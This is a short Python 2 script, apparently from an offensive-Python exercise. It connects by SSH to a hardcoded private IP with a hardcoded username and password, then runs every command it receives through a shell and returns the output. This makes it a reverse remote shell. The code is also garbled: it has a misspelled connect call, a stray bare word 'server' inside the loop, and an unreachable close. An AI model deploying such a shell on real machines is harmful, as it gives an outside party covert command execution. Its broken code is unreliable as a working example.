import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connet(ip,username = user, password= passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        #read banner
        print ssh_session.recv(1024)
        while True:
            #get the command from the ssh
            command = ssh_session.recv(1024)
            server
            try:
                cmd_output = subprocess.check_output(command, shell = True)
                ssh_session.send(cmd_output)
            except Exception, ex:
                ssh_session.send(str(ex))
        client.close()
    return
ssh_command('192.168.100.130','khanh', 'pip_python', 'ClientConnected')
